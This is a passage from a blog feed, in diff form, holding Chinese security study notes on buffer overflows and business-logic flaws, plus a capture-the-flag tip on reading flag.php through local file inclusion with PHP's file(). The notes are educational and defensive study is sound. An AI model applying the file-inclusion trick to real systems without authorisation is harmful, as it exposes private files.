-在计算机内部，输入数据通常被存放在一个临时空间内，这个临时存放的空间就被称为缓冲区，缓冲区的长度事先已经被程序或者操作系统定义好了。向缓冲区内填充数据，如果数据的长度很长，超过了缓冲区本身的容量，那么数据就会溢出存储空间，而这些溢出的数据还会覆盖在合法的数据上。<br>
-操作系统所使用的缓冲区又被称为堆栈，在各个操作进程之间，指令被临时存储在堆栈当中，堆栈也会出现缓冲区溢出。 当一个超长的数据进入到缓冲区时，超出部分就会被写入其他缓冲区，其他缓冲区存放的可能是数据、下一条指令的指针，或者是其他程序的输出内容，这些内容都被覆盖或者破坏掉。</p>
-<p>15 业务逻辑漏洞<br>
-业务逻辑问题是一种设计缺陷，逻辑缺陷表现为设计者或开发者在思考过程中做出的特殊假设存在明显或隐含的错误。攻击者会特别注意目标应用程序采用的逻辑方式，设法了解设计者与开发者做出的可能假设，然后考虑如何攻破这些假设。攻击者挖掘逻辑漏洞有两个重点：业务流程、http/https请求篡改。<br>
-业务逻辑漏洞经常出现的场景为：账户（注册/登录/密码找回）、交易、支付、个人信息修改。<br>
-作者：Fighting_001<br>
-链接：https://www.jianshu.com/p/184863b67bb1<br>
-来源：简书<br>
-著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
-<p>本地包含时如果想要打开的是一个数组最好用file打开如file(&quot;flag.php&quot;)<br>
-<img src="https://jinqipiaopiao.github.io//post-images/1623834341248.png" alt="" loading="lazy"><br>
-<img src="https://jinqipiaopiao.github.io//post-images/1623834380453.png" alt="" loading="lazy"><br>
-file() 函数把整个文件读入一个数组中。<br>
-与 file_get_contents() 类似，不同的是 file() 将文件作为一个数组返回。数组中的每个单元都是文件中相应的一行，包括换行符在内。如果失败，则返回 false。</p>
 ]]></content>
     </entry>
 </feed>
